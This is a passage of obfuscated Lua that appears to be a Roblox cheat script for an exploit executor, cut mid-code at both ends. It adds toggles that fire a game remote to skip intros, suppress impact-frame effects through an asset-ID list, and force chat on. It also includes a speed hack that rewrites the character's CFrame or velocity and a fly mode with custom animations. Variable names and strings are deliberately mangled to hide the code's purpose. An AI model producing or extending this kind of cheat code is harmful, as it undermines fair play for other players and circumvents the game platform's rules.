 _IIIlllllII = newChild:GetPropertyChangedSignal("\067\097\109\101\114\097\084\121\112\101"):Connect( function () if newChild.CameraType ~= Enum.CameraType.Custom and _IIlIlIIlIl.NoCameraAnimations.Value and not getgenv()._cpCamActive then task.spawn(fixCam) end
 end
 ) end
 end
 function fixCam() if not _lIIIIIIllI(_llIIIlIIll) then repeat task.wait() until _lIIIIIIllI(_llIIIlIIll) end
 local _lllIIlIIIl = _lIIIIIIllI(_llIIIlIIll) local _IIIIIlIlIl if _lllIIlIIIl then _IIIIIlIlIl = getHumanoid(_lllIIlIIIl) else _IIIIIlIlIl = _lllIIlIIIl end
 if _lllIIlIIIl and (_IIIIIlIlIl and workspace.CurrentCamera) then local _IllIIIIIIl = workspace.CurrentCamera.CFrame workspace.CurrentCamera:Destroy() local _IIlllllIII = Instance.new("\067\097\109\101\114\097", workspace) _IIlllllIII.CameraType = "\067\117\115\116\111\109" _IIlllllIII.CameraSubject = _IIIIIlIlIl _IIlllllIII.CFrame = _IllIIIIIIl _llIIIlIIll.CameraMode = "\067\108\097\115\115\105\099" _lllIIlIIIl:WaitForChild("\072\101\097\100", 0x1).Anchored = false end
 end
 _llllIlIIIl:AddToggle("\078\111\067\097\109\101\114\097\065\110\105\109\097\116\105\111\110\115", { Text = "\078\111\032\067\117\116\115\099\101\110\101\115", Default = false, Callback = function (noCamAnimVal) if noCamAnimVal then local _IIllIlIIIl = _llIIIlIIll.Character if _IIllIlIIIl and _IIllIlIIIl:FindFirstChild("\067\111\109\109\117\110\105\099\097\116\101") then pcall( function () _IIllIlIIIl.Communicate:FireServer({ Goal = "\068\105\115\097\098\108\101\032\073\110\116\114\111" }) end
 ) end
 local _IllllIllll = workspace.CurrentCamera if _IllllIllll and _IllllIllll.CameraType ~= Enum.CameraType.Custom then task.spawn(fixCam) end
 end
 end
 , }) do local _IlIIllIIll = nil local _lIlIIIIlIl = { FXUi = true, ImpactFrames = true, Flash = true, Flexworks = true, Impact = true, Impact2 = true, Impact3 = true, BatImpact = true, GuiAnim = true } local _lIIIIlIlll = { [0x3BC3F1AFB] = true, [0x3BC3F223F] = true, [0x3BC3F2B79] = true, [0x5FC35F7740E8] = true, [0x5E8F84879F0B] = true, [0x54DBF3809978] = true, [0x56220E50C5F3] = true, [0x770F239BB079] = true, [0x633A60BA49E3] = true, [0x72BC8EF5B153] = true, [0x6D913898D140] = true, [0x55B4CFCEE592] = true, [0x6881480FBD2B] = true, [0x582CF79F56F3] = true, [0x46DCD0648ADE] = true, [0x5144D04238B9] = true, [0x6921A0CB23EE] = true, [0x68BDB17A7D69] = true, [0x625048FE0E9A] = true, [0x5DA0D3DFC2A2] = true, [0x692C69587296] = true, [0x60C7317CD992] = true, [0x5E95D54BF4A2] = true, [0x5A01B50144AC] = true, [0x7DC4B666CE68] = true, [0x428D1E18EC6D] = true, [0x6AE4D46E0A15] = true, [0x6E534115F65B] = true, [0x43738E64E5B4] = true, [0x7D75A61C9FDA] = true, [0x569B8B91F323] = true, [0x41E14E640DE5] = true, [0x6CD1A93F9ED3] = true, [0x5D547FD7B831] = true, [0x649A718AD413] = true, [0x49C2125A0440] = true, [0x4F686431F2ED] = true, [0x5FE4E7F36AB7] = true, [0x7A8ED95E2BD1] = true, [0x4EA5DE474867] = true, [0x5906436C9A39] = true, [0x45BF131CF373] = true, [0x60A4E89C34D7] = true, [0x49FF676EB0B7] = true, [0x678561E65951] = true, [0x552A43424D4A] = true, [0x440DD079C97B] = true, [0x494711F634D5] = true, [0x76F4B826F867] = true, [0x5CFD7A238852] = true, [0x63F8DE24F444] = true, [0x6190B2029DBC] = true, [0x648DC1F688AB] = true, [0x52E222993837] = true, [0x4ACEABD36066] = true, [0x679A721E5806] = true, [0x4E974CD418A5] = true, [0x7676DF0A469F] = true, [0x75D0F4A20A15] = true, [0x56118B2BDD7C] = true, [0x5FEC83CD1924] = true, [0x71F1E7F4B692] = true, [0x5D85442CB6C7] = true, [0x5B757B97FF01] = true, [0x41C8848E5BFD] = true, [0x56302EC498A6] = true, [0x63CE3EC70DFE] = true, [0x55964C9C31C5] = true, [0x7B17882EC15A] = true, [0x69D6506B3F1C] = true, [0x7E2EDCB1A32F] = true, [0x61ADC0D56D1E] = true, [0x68F697F6E145] = true, [0x50100800C970] = true, [0x68044FD5FD9F] = true, [0x40ADC200C8EB] = true, [0x749B29607E2B] = true, [0x7B56B0E6CC8A] = true, [0x7C66496A614D] = true, [0x73AC72714191] = true, [0x49E977F18D91] = true, [0x6215BA0A48E3] = true, [0x78DA841DF5D6] = true, [0x69822295F48A] = true, [0x4F16F22015CD] = true, [0x7F98DE8C2AC7] = true, [0x59746210EAB5] = true, [0x42F1A99AF679] = true, [0x6F80E2396BF1] = true, [0x6AA1D19430FC] = true, [0x56DF84FEA88B] = true, [0x7E4859BB6B23] = true, [0x433E5854751B] = true, [0x5E4081D28A94] = true, [0x4ED41B680751] = true, [0x5C66176BFE2C] = true, [0x5BE218E88EDC] = true, [0x7ACD9B9B6B29] = true, [0x69B978DC2C6A] = true, [0x5F1637633798] = true, [0x7153208A8DB8] = true, [0x5675B4230B03] = true, [0x68D7AC06ED7E] = true, [0x6BE954D45BAA] = true, [0x43C0826ECABE] = true, [0x5A655A427CA3] = true, [0x76E90474B282] = true, [0x71166A586838] = true, [0x69A55FAA1053] = true, [0x6C4503A41A42] = true, [0x4DA1D3904B87] = true, [0x7A2244560959] = true, [0x4955E787945B] = true, [0x5F0C0F34E9E8] = true, [0x7FCC921B5ACD] = true, [0x4C3782D3A3CA] = true, [0x6C25982D2345] = true, [0x46DA5BFDD007] = true, [0x5731C58D2D88] = true, [0x7CFF9FCDC972] = true, [0x4C3602AB98FF] = true, [0x526A7A9B88EF] = true, [0x59030EE573F6] = true, [0x71C105FB0921] = true, [0x46AF7765201A] = true, [0x7AE676D1D7AC] = true, [0x793A42E4E08B] = true, [0x6F9A486AB209] = true, [0x53C03C13C7BD] = true, [0x64E1938970F5] = true, [0x6A4A88B11565] = true, [0x55677E4D1FAC] = true, [0x4DC27FB6133E] = true, [0x71A87077CC1B] = true, [0x7E6C7EA97407] = true, [0x5BD50A374985] = true, [0x72A9CCDFF0A7] = true, [0x5FBAF6496EDA] = true, [0x540CD07C5849] = true, [0x7D6C5866D19A] = true, [0x48F7FD5D2B6B] = true, [0x59BA3DAEF526] = true, [0x72BB06778100] = true, [0x5473254D4570] = true, [0x7ED3E15A8765] = true, [0x426A0D7B7F67] = true, [0x79B96E585B8C] = true, [0x52C9313381B9] = true, [0x7C37BD4BF29A] = true, [0x73AC49F77AB1] = true, [0x5A4702620882] = true, [0x79E28ED1D5AE] = true, [0x422932D7AC97] = true, [0x11C02CD40] = true, [0x11C02CA52] = true, [0x379F12621] = true, [0x37A0209EF] = true, [0x379FA2FCB] = true, [0x61207F5B9BF7] = true, [0x503AC6D3E73D] = true, [0x5CE1BBA75F22] = true, [0x6FC28E1F17FA] = true, [0x77CFA2B54D68] = true, [0x4E7E9A85E2A0] = true, [0x5FC0DD03D936] = true, [0x5EB3A2A12D65] = true, [0x596FD823CFB0] = true, [0x6765F3F3EC4D] = true, [0x73896027EAFC] = true, [0x5AB94DA4C804] = true, [0x7B824DE9E7EC] = true, [0x75DDE77D0CDB] = true, [0x7326A2C28404] = true, [0x6A4723820DEC] = true, [0x633211BBE48F] = true, [0x3BC3A2C72] = true, [0x3BC3A2B22] = true, [0x3BC3A37A7] = true, [0x3BC3A39EB] = true, [0x3BC3A2D40] = true, [0x3BC3A2ED6] = true, [0x3BC3A2FD5] = true, [0x3BC3A30BA] = true, [0x3BC3A320B] = true, [0x3BC3A3346] = true, [0x3BC3A34C5] = true, [0x3BC3A35C4] = true, [0x3BCF48110] = true, [0x3BCF48CF6] = true, [0x3BCF4A4B3] = true, [0x3BD0DD702] = true, [0x3BD0F0A31] = true, [0x405BC32B5] = true, [0x405BC33C0] = true, [0x405BC31B6] = true, [0x44C6A04A1] = true, [0x40A8BD750] = true, [0x40A02919C] = true, [0x374EA010B] = true, [0x409F5C270] = true, [0x40A00A76E] = true, [0x40A00B20C] = true, [0x40A00BEE4] = true, [0x40A00AD96] = true, [0x40A01067B] = true, [0x40A01059B] = true, [0x40A010447] = true, [0x40A010334] = true, [0x40A010252] = true, [0x40A010149] = true, [0x40A010086] = true, [0x40A00FFB6] = true, [0x40A00FE62] = true, [0x40A00FD19] = true, [0x40A00FBE5] = true, [0x40A00FAEB] = true, [0x40A00F9A3] = true, [0x40A00F833] = true, [0x40A00F6C4] = true, [0x40A00F505] = true, [0x40A00F3C1] = true, [0x40A00F248] = true, [0x40A00F0DF] = true, [0x40A00EFC8] = true, [0x40A00EEA1] = true, [0x40A00ED68] = true, [0x40A00EAC5] = true, [0x40A00E990] = true, [0x40A00E838] = true, [0x40A00E682] = true, [0x40A00E543] = true, [0x40A00E44C] = true, [0x40A00E305] = true, [0x40A00E1C9] = true, [0x40A00DFBC] = true, [0x40A00DDC8] = true, [0x40A00DCBE] = true, [0x40A00DBEE] = true, [0x3FAEB0EE4] = true, [0x3FAEB05B8] = true, [0x3FAEB07EB] = true, [0x3FAEB09D6] = true, [0x3FAEB0B44] = true, [0x3FAEB0D31] = true, [0x3FAEB0DB4] = true, [0x3FAEB0493] = true, [0x44D0DA860] = true, [0x44D0DA43E] = true, [0x44D0DA1E9] = true, [0x44D0D9FE2] = true, [0x44D0D9E46] = true, [0x44D0D9CCD] = true, [0x44D0D9AF2] = true, [0x44D0D9899] = true, [0x44D0D9699] = true, [0x44D0D9483] = true, [0x44D0DB611] = true, [0x44D0D92D9] = true, [0x44D0D90EF] = true, [0x44D0D8F34] = true, [0x44D0D8D30] = true, [0x44D0E60B8] = true, [0x44D0D89AD] = true, [0x44D0DB46C] = true, [0x44D0DB2D3] = true, [0x44D0DB12F] = true, [0x44D0DAF47] = true, [0x44D0DAD3A] = true, [0x44D0DAB7D] = true, [0x44D0DAA42] = true, [0x44D0DB7A7] = true, [0x13412B939] = true, [0x410F36FE1] = true, [0x44CCB5D32] = true, [0x44B3D71B8] = true, [0x3F362A95C] = true, [0x781754968156] = true, [0x5078D7CC4D7C] = true, [0x5AC6AA80104E] = true, [0x6EC1AF5C6741] = true, [0x794B088815E1] = true, [0x6D728BBC72F6] = true, [0x429C6DA0D355] = true, [0x6FDD888439DB] = true, [0x79F3F28C53E4] = true, [0x5F0F979BB7CF] = true, [0x785EC7F6AF4F] = true, [0x6A8F7697657D] = true, [0x6CCD0C158DAF] = true, [0x491A99E21D8D] = true, [0x7E01B8A8219C] = true, [0x476F432D2EA4] = true, [0x4CE8592D0ED1] = true, [0x6E25F2ACEE9F] = true, [0x73E5BD79EE5A] = true, [0x7B55921D3AA2] = true, [0x4649E1F5B3C4] = true, [0x51EAB26A1C73] = true, [0x7222D9F01B97] = true, [0x79A8B8729725] = true, [0x56E249A7D9A8] = true, [0x5A63529ED4BE] = true, [0x4EEDDC4A2DCD] = true, [0x4EC0ABA01BF0] = true, [0x5D76F90D5619] = true, [0x797D78F1B689] = true, [0x5A107BC1F1AF] = true, [0x63D6BDB9E05A] = true, [0x7B294F40298A] = true, [0x7215E3AE58B8] = true, [0x7A50394198ED] = true, [0x6D6283E9C959] = true, [0x6EC4D667AD2F] = true, [0x4AF450E0AD1B] = true, [0x4C9023B29FC0] = true, [0x4AAC515F407C] = true, [0x4F85607EAC18] = true, [0x522D90BDC718] = true, [0x5D118E4976EE] = true, [0x5E3780C08E39] = true, [0x6D4559F7B570] = true, [0x4C6AA0015A71] = true, [0x485E3EE39392] = true, [0x5ABD54E12241] = true, [0x6BD4E14152EE] = true, [0x7080C54528D4] = true, [0x6F320869EB69] = true, [0x624F2EA82027] = true, [0x7E2E7503CA56] = true, [0x48698672C52D] = true, [0x53D225B653E5] = true, [0x7778319C0C15] = true, [0x6A882E4B9CA3] = true, [0x5FA6136672D3] = true, [0x68606A71162B] = true, [0x7D6624921802] = true, [0x49CDC0747278] = true, [0x56E41778F296] = true, [0x7F9BEDC4303F] = true, [0x7EF9FD916BB5] = true, [0x6FD4ECA6B716] = true, [0x4DF2E91A35FE] = true, [0x718BFF76F687] = true, [0x528EBE742889] = true, [0x50E0ED0FB885] = true, [0x72A174B71370] = true, [0x435A425C65B3] = true, [0x5AD55C0C561D] = true, [0x62D4FEDB5CA5] = true, [0x62BC95037749] = true, [0x42C454F37B2A] = true, [0x56D0A332A8E5] = true, [0x66639084D145] = true, [0x595B0E987A14] = true, [0x5A37B63C14B0] = true, [0x6C642ADBEAD1] = true, [0x5775ECE61A24] = true, [0x43BB3B405755] = true, [0x50008322F0B3] = true, [0x65BCECBB73CA] = true, [0x6135EC25F97D] = true, [0x4B39E4B4484F] = true, [0x6644329878C9] = true, [0x4E5D7940247D] = true, [0x783EB2F49857] = true, [0x600011B27E3F] = true, [0x6D4CB904CC9B] = true, [0x6BA39BFBD97C] = true, [0x5754B3088FCE] = true, [0x6CE931C8713D] = true, [0x573F6ABE9A6F] = true, [0x64EFC24188E8] = true, [0x4BF3356A941E] = true, [0x50F3EA48F507] = true, [0x7409DB7CAC6C] = true, [0x764F0C5DBD73] = true, [0x4545C43E27A2] = true, [0x43F5D67DD1C5] = true, [0x5A9932BC10FB] = true, [0x425433F6C7DE] = true, [0x6A33B062A015] = true, [0x483BC959A594] = true, [0x54B2F0149C75] = true, [0x54AACB1E3F49] = true, [0x5742DD42842F] = true, [0x7324383834A5] = true, [0x6EAC95088EAF] = true, [0x5D6AE6380730] = true, [0x442693A60966] = true, [0x7BA0447C51FC] = true, [0x615917191BA9] = true, [0x672AE8758E1D] = true, [0x70957CEC9353] = true, [0x761FF41BFC6A] = true, [0x7F7C67EA1A8F] = true, [0x5E607AB760EA] = true, [0x673F8B866644] = true, [0x672308B48A42] = true, [0x4A5F2186F3B8] = true, [0x52E5F21255E6] = true, [0x7BD40CF5AFBD] = true, [0x72B9628C9C6A] = true, [0x43EBDBC06550] = true, [0x76D27E8E4EDB] = true, [0x79DFB2B1F31B] = true, [0x5E9599052AB6] = true, [0x5BA4E09BDDC7] = true, [0x4A1E4C323290] = true, [0x28B272078] = true, [0x3D87833AB] = true, [0x3D879217F] = true, [0x3D87846FB] = true, [0x3D8785596] = true, [0x3D87863FE] = true, } local _IllIllllII = nil local function _IIIIllIIIl(elem) local _IIIIllIIlI = tonumber((elem.Image or ""):match("\037\100\043")) if _IIIIllIIlI and _lIIIIlIlll[_IIIIllIIlI] then pcall( function () elem.ImageTransparency = 0x1 end
 ) pcall( function () elem.BackgroundTransparency = 0x1 end
 ) end
 end
 local function _lIIllIlIlI(sg) if _lIlIIIIlIl[sg.Name] then sg.Enabled = false return end
 end
 _llllIlIIIl:AddToggle("\078\111\073\109\112\097\099\116\070\114\097\109\101\115", { Text = "\078\111\032\073\109\112\097\099\116\032\070\114\097\109\101\115", Default = false, }):OnChanged( function () local _llIllIIllI = _llIIIlIIll:FindFirstChild("\080\108\097\121\101\114\071\117\105") if _IIlIlIIlIl.NoImpactFrames.Value then local _llllllIIII = _llIllIIllI and _llIllIIllI:FindFirstChild("\077\111\098\105\108\101\074\117\110\107") if _llllllIIII then _llllllIIII.Enabled = false end
 if _llIllIIllI then for _lllIlllIIl, sg in ipairs(_llIllIIllI:GetChildren()) do if sg:IsA("\083\099\114\101\101\110\071\117\105") then pcall(_lIIllIlIlI, sg) end
 end
 _IlIIllIIll = _llIllIIllI.ChildAdded:Connect( function (_IIlIlIIIII) if not _IIlIlIIIII:IsA("\083\099\114\101\101\110\071\117\105") then return end
 if _lIlIIIIlIl[_IIlIlIIIII.Name] then _IIlIlIIIII.Enabled = false end
 end
 ) _IllIllllII = _llIllIIllI.DescendantAdded:Connect( function (elem) if not (elem:IsA("\073\109\097\103\101\076\097\098\101\108") or elem:IsA("\073\109\097\103\101\066\117\116\116\111\110")) then return end
 pcall(_IIIIllIIIl, elem) end
 ) end
 else if _IlIIllIIll then _IlIIllIIll:Disconnect() _IlIIllIIll = nil end
 if _IllIllllII then _IllIllllII:Disconnect() _IllIllllII = nil end
 local _llllllIIII = _llIllIIllI and _llIllIIllI:FindFirstChild("\077\111\098\105\108\101\074\117\110\107") if _llllllIIII then _llllllIIII.Enabled = true end
 if _llIllIIllI then for _IlIIIIIlll in pairs(_lIlIIIIlIl) do local _IlIlIlIIIl = _llIllIIllI:FindFirstChild(_IlIIIIIlll) if _IlIlIlIIIl then _IlIlIlIIIl.Enabled = true end
 end
 end
 end
 end
 ) table.insert(_llIlllIlIl, function () if _IlIIllIIll then _IlIIllIIll:Disconnect() _IlIIllIIll = nil end
 if _IllIllllII then _IllIllllII:Disconnect() _IllIllllII = nil end
 pcall( function () _IIlIlIIlIl.NoImpactFrames:SetValue(false) end
 ) end
 ) end
 _llllIlIIIl:AddToggle("\065\108\119\097\121\115\067\097\110\067\104\097\116", { Text = "\065\108\119\097\121\115\032\067\097\110\032\067\104\097\116", Default = false, }) do local _IIlIllIlIl = game:GetService("\083\116\097\114\116\101\114\071\117\105") _IIlIllIlIl.CoreGuiChangedSignal:Connect( function (param, enabled) if enabled then return end
 if not _IIlIlIIlIl.AlwaysCanChat.Value then return end
 if param == Enum.CoreGuiType.Chat or param == Enum.CoreGuiType.All then RunService.RenderStepped:Wait() _IIlIllIlIl:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true) end
 end
 ) end
 _llllIlIIIl:AddDivider() _llllIlIIIl:AddToggle("\086\105\115\117\097\108\105\122\101\114", { Text = "\068\101\115\121\110\099\032\086\105\115\117\097\108\105\122\101\114", Default = false, }) _llllIlIIIl:AddToggle("\065\108\119\097\121\115\086\105\115\117\097\108\105\122\101", { Text = "\065\108\119\097\121\115\032\069\110\097\098\108\101\100", Default = false, }) task.spawn( function () if workspace.CurrentCamera then patchCamera(workspace.CurrentCamera) end
 workspace.ChildAdded:Connect( function (_IIlIlIIIII) task.defer(patchCamera, _IIlIlIIIII) end
 ) end
 ) table.insert(_llIlllIlIl, function () if _IIIlllllII then _IIIlllllII:Disconnect() _IIIlllllII = nil end
 if _fovRenderConn then _fovRenderConn:Disconnect() _fovRenderConn = nil end
 pcall( function () _IIlIlIIlIl.NoCameraAnimations:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.FOVEnabled:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.Visualizer:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.AlwaysVisualize:SetValue(false) end
 ) end
 ) do RevenantWhitelist = RevenantWhitelist or {} end
 end
 do local _IlllIIIlll = { Forward = "\049\055\049\050\052\048\054\051\056\050\054", Back = "\049\055\049\050\052\048\054\055\054\051\053", Left = "\049\055\049\050\052\049\048\053\050\057\052", Right = "\049\055\049\050\052\049\049\050\053\052\055", _IlIlIlllII = "\049\055\049\050\052\048\054\049\054\054\051", } local _IlIIIIIIII = 0.1 local _IIlllllllI = {} local function _lIlIIlIIll() for _lllIlllIIl, _IIlIIllIIl in pairs(_IIlllllllI) do pcall( function () if _IIlIIllIIl.IsPlaying then _IIlIIllIIl:Stop(0x0) end
 end
 ) pcall( function () _IIlIIllIIl:Destroy() end
 ) end
 _IIlllllllI = {} end
 local function _lIllIIIlll(_IIIlIllIIl) for _IlIIIIIlll, _llIIllIlIl in pairs(_IIlllllllI) do local _IlllIlIIIl = false for _lllIlllIIl, _llllIIllll in ipairs(_IIIlIllIIl) do if _llllIIllll == _IlIIIIIlll then _IlllIlIIIl = true break end
 end
 if _IlllIlIIIl then if not _llIIllIlIl.IsPlaying then pcall( function () _llIIllIlIl:Play(_IlIIIIIIII) end
 ) end
 else if _llIIllIlIl.IsPlaying then pcall( function () _llIIllIlIl:Stop(_IlIIIIIIII) end
 ) end
 end
 end
 end
 _IlIIIllllI:AddToggle("\083\112\101\101\100\072\097\099\107\069\110\097\098\108\101\100", { Text = "\067\070\114\097\109\101\032\083\112\101\101\100", Default = false, }) _IlIIIllllI:AddSlider("\083\112\101\101\100\072\097\099\107", { Text = "\083\112\101\101\100", Default = 0x1, Min = 0x1, Max = 0x61A8, Rounding = 0x1, Compact = true, }) _IlIIIllllI:AddDropdown("\083\112\101\101\100\072\097\099\107\077\101\116\104\111\100", { Text = "\077\101\116\104\111\100", Values = { "\067\070\114\097\109\101", "\086\101\108\111\099\105\116\121" }, Default = 0x1, Multi = false, }) _IlIIIllllI:AddToggle("\085\112\115\105\100\101\068\111\119\110", { Text = "\085\112\115\105\100\101\032\068\111\119\110", Default = false, Callback = function (_lIllIlIIll) _IlIIlIllIl["\085\112\115\105\100\101\032\068\111\119\110"] = _lIllIlIIll end
 , }) task.spawn( function () while RunService.PreSimulation:Wait() do local _IlIIIIIlll = _IlIllIIllI.SpeedHackMethod.Value local _IIllllIlII = _llIIIlIIll.Character local _llIIlIIlII = _IIllllIlII and _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IlIIIlIIII = _IIllllIlII and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIllllIlII and _llIIlIIlII and _IlIIIlIIII and _IIlIlIIlIl.SpeedHackEnabled.Value and not _IlIIlIllIl.Flying then if _IlIIIIIlll == "\067\070\114\097\109\101" then _llIIlIIlII.CFrame = _llIIlIIlII.CFrame + _IlIIIlIIII.MoveDirection * (_IlIllIIllI.SpeedHack.Value / 0x2710) elseif _IlIIIIIlll == "\086\101\108\111\099\105\116\121" and _IlIIIlIIII.MoveDirection ~= Vector3.new() then repeat local _lIIIIIIIII = _IlIIIlIIII.MoveDirection.Unit * (_IlIllIIllI.SpeedHack.Value / 0x64) _llIIlIIlII.Velocity = Vector3.new(_lIIIIIIIII.X, _llIIlIIlII.Velocity.Y, _lIIIIIIIII.Z) RunService.PreSimulation:Wait() until _IlIIIlIIII.MoveDirection == Vector3.new() or _IlIllIIllI.SpeedHackMethod.Value ~= _IlIIIIIlll _llIIlIIlII.Velocity = Vector3.new() end
 end
 end
 end
 ) table.insert(_llIlllIlIl, function () pcall( function () _IIlIlIIlIl.UpsideDown:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.SpeedHackEnabled:SetValue(false) end
 ) end
 ) _IIIIlIIIll:AddToggle("\082\101\118\101\110\097\110\116\070\108\121", { Text = "\070\108\121", Default = false, Callback = function (flyToggleVal) if not flyToggleVal then if _IlIllIIllI.RevenantFlyBind then _IlIllIIllI.RevenantFlyBind.Toggled = false end
 _IlIIlIllIl.Flying = false end
 end
 , }):AddKeyPicker("\082\101\118\101\110\097\110\116\070\108\121\066\105\110\100", { SyncToggleState = false, Mode = "\084\111\103\103\108\101", Default = "\089", Text = "\070\108\121", Callback = function (flySpeedVal) if _lIllIlllll.Fly then return end
 if flySpeedVal and not _IIlIlIIlIl.RevenantFly.Value then RunService.RenderStepped:Wait() _lIllIlllll.Fly = true _IlIllIIllI.RevenantFlyBind.Toggled = false _IlIllIIllI.RevenantFlyBind:DoClick() _lIllIlllll.Fly = false return end
 if not _IIlIlIIlIl.RevenantFly.Value then return end
 _IlIIlIllIl.Flying = not _IlIIlIllIl.Flying _IllIIlIIll:Notify({ Title = _lIllIllIII("\070\108\121"), Content = _IlIIlIllIl.Flying and "\084\111\103\103\108\101\100\032\111\110\032\9989" or "\084\111\103\103\108\101\100\032\111\102\102\032\10060", _IllIIlIlll = 0x2 }) if not _IlIIlIllIl.Flying then end
 local _lIIIllllII = nil local _lllIIIlIll = _lIIIIIIllI(_llIIIlIIll) local _IIlIlIlllI if _lllIIIlIll then _IIlIlIlllI = getHumanoid(_lllIIIlIll) else _IIlIlIlllI = _lllIIIlIll end
 local _IlllIlIIII if _lllIIIlIll then _IlllIlIIII = getRoot(_lllIIIlIll) else _IlllIlIIII = _lllIIIlIll end
 if _lllIIIlIll and (_IlllIlIIII and _IIlIlIlllI) then _lIIIllllII = _IlllIlIIII.CFrame end
 if _IIlIlIlllI then for _lllIlllIIl, _IIlIIllIIl in pairs(_IIlIlIlllI:GetPlayingAnimationTracks()) do local _IlllIIlIII = _IIlIIllIIl.Animation and _IIlIIllIIl.Animation.AnimationId:match("\037\100\043") or '' if _IlllIIlIII == "\055\056\049\053\054\049\056\049\055\053" or _IlllIIlIII == "\053\048\055\055\055\055\056\050\054" or _IlllIIlIII == "\053\048\055\055\055\054\048\052\051" or _IlllIIlIII == "\054\049\054\049\054\051\054\056\050" then pcall( function () _IIlIIllIIl:Stop(0x0) end
 ) end
 end
 end
 if _IllIlllllI[_lIIIlIIllI] then local _IIIlIlllll = _lllIIIlIll local _IlIIIIlIIl = _IIIlIlllll and _IIIlIlllll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIIIllllll = _IlIIIIlIIl and _IlIIIIlIIl:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if _IIIlIlllll and _IIIIllllll then _lIlIIlIIll() for _IlIIIIIlll, _IIIIllIIlI in pairs(_IlllIIIlll) do local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IIIIllIIlI local _IIlIIllIIl = _IIIIllllll:LoadAnimation(_llllIlIllI) _IIlIIllIIl.Priority = Enum.AnimationPriority.Action _IIlIIllIIl.Looped = true _IIlllllllI[_IlIIIIIlll] = _IIlIIllIIl end
 end
 end
 local _IIIlllllIl = RunService.Heartbeat:Connect( function (flyDelta) local _lIllIIIIIl = _lIIIIIIllI(_llIIIlIIll) local _lIIIllIlll if _lIllIIIIIl then _lIIIllIlll = getHumanoid(_lIllIIIIIl) else _lIIIllIlll = _lIllIIIIIl end
 local _IllIlIllII if _lIllIIIIIl then _IllIlIllII = getRoot(_lIllIIIIIl) else _IllIlIllII = _lIllIIIIIl end
 local _llIlIllIIl = workspace.CurrentCamera if _lIllIIIIIl and (_IllIlIllII and (_lIIIllIlll and _llIlIllIIl)) then local _lIIlIlllII = _IlIllIIllI.RevenantFlySpeed.Value / 0x64 local _lIllIIlllI = Vector3.new(0x0, 0x0, 0x0) CFrame.new(0x0, 0x0, 0x0) local _IlIlIIlIII = _llIlIllIIl.CFrame local _lIlIlllIll = _IlIlIIlIII.LookVector local _IIlIIllIIl = _IlIlIIlIII.RightVector local _IIIIIlIllI = CFrame.new(_IllIlIllII.Position, _IllIlIllII.Position + Vector3.new(_lIlIlllIll.X, 0x0, _lIlIlllIll.Z)) local _IlIIllIIII = math.round((_lIIIllIlll.MoveDirection:Dot(_IIIIIlIllI.LookVector))) local _IIIIIIIlIl = math.round((_lIIIllIlll.MoveDirection:Dot(_IIIIIlIllI.RightVector))) if _IlIIllIIII == 0x1 then _lIllIIlllI = _lIllIIlllI + _lIlIlllIll * _lIIlIlllII local _lllIlllIIl = _IllIlIllII.CFrame + _lIlIlllIll * (flyDelta * _lIIlIlllII) end
 if _IlIIllIIII == -0x1 then _lIllIIlllI = _lIllIIlllI + _lIlIlllIll * -_lIIlIlllII local _lllIlllIIl = _IllIlIllII.CFrame + -_lIlIlllIll * (flyDelta * _lIIlIlllII) end
 if _IIIIIIIlIl == -0x1 then _lIllIIlllI = _lIllIIlllI + _IIlIIllIIl * -_lIIlIlllII local _lllIlllIIl = _IllIlIllII.CFrame + -_IIlIIllIIl * (flyDelta * _lIIlIlllII) end
 if _IIIIIIIlIl == 0x1 then _lIllIIlllI = _lIllIIlllI + _IIlIIllIIl * _lIIlIlllII local _lllIlllIIl = _IllIlIllII.CFrame + _IIlIIllIIl * (flyDelta * _lIIlIlllII) end
 if _IlIIllIIII == 0x0 and _IIIIIIIlIl == 0x0 then _IllIlIllII.Velocity = Vector3.new() _IllIlIllII.CFrame = _lIIIllllII or _IllIlIllII.CFrame else _IllIlIllII.Velocity = _lIllIIlllI _lIIIllllII = _IllIlIllII.CFrame end
 _IllIlIllII.RotVelocity = Vector3.new() _IllIlIllII.CFrame = CFrame.new(_IllIlIllII.CFrame.Position, _IllIlIllII.CFrame.Position + _IlIlIIlIII.LookVector) if _IllIlllllI[_lIIIlIIllI] then local _IllIIIIlIl = {} if _IlIIllIIII == 0x1 then table.insert(_IllIIIIlIl, "\070\111\114\119\097\114\100") elseif _IlIIllIIII == -0x1 then table.insert(_IllIIIIlIl, "\066\097\099\107") end
 if _IIIIIIIlIl == 0x1 then table.insert(_IllIIIIlIl, "\082\105\103\104\116") elseif _IIIIIIIlIl == -0x1 then table.insert(_IllIIIIlIl, "\076\101\102\116") end
 if #_IllIIIIlIl == 0x0 then _IllIIIIlIl = { "\073\100\108\101" } end
 _lIllIIIlll(_IllIIIIlIl) end
 end
 end
 ) repeat task.wait() until not _IlIIlIllIl.Flying _IlIIlIllIl.Flying = false _IIIlllllIl:Disconnect() _lIlIIlIIll() local _IIIIIllllI = _lIIIIIIllI(_llIIIlIIll) local _lIIIIIllII if _IIIIIllllI then _lIIIIIllII = getRoot(_IIIIIllllI) else _lIIIIIllII = _IIIIIllllI end
 local _IIIIlIIlll if _IIIIIllllI then _IIIIlIIlll = getHumanoid(_IIIIIllllI) else _IIIIlIIlll = _IIIIIllllI end
 if _IIIIlIIlll then _IIIIlIIlll.AutoRotate = true end
 if _IIIIIllllI and (_lIIIIIllII and (_IIIIlIIlll and not _IIIIlIIlll.SeatPart)) then local _IlIIllIllI = tick() _lIIIIIllII.Velocity = Vector3.new() if _lIIIIIllII.Velocity.Magnitude <= 0x5 or tick() >= _IlIIllIllI + 0x1 then end
 end
 if not (_IIIIlIIlll and _IIIIlIIlll.SeatPart) then end
 local _IlllIIlIII = tick() while true do if _IIIIlIIlll and _IIIIlIIlll.SeatPart then _IIIIlIIlll.SeatPart.Velocity = Vector3.new() end
